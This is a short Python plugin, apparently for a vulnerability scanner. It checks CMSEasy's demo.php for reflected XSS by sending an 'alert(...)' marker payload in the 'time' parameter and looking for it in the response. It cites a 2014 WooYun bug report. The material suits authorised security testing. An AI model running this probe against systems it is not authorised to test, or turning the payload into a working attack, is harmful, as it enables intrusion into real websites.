#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Medici.Yan'
#Cmseasy /demo.php 处反射型XSS
#http://www.wooyun.org/bugs/wooyun-2014-069363
def assign(service, arg):
	if service == "cmseasy":
		return True, arg
def audit(arg):
        desurl=arg+"demo.php?time=alert(e10adc3949ba59abbe56e057f20f883e)"
        code,head,content,errcode,re_url=curl.curl(desurl)
        if code==200 and 'alert(e10adc3949ba59abbe56e057f20f883e)' in content:
              security_info(desurl)
              
if __name__ == '__main__':
	from dummy import *
	audit(assign('cmseasy', 'http://www.example.com/')[1])
